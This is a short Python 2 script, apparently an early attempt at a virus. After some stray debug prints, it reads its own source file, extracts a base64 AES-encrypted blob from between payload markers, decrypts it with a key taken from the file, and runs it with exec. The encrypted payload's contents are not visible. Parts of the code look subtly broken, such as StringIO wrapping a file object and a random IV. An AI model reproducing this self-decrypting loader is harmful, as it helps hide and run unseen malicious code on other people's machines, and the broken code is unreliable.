print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"



print "lolol"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload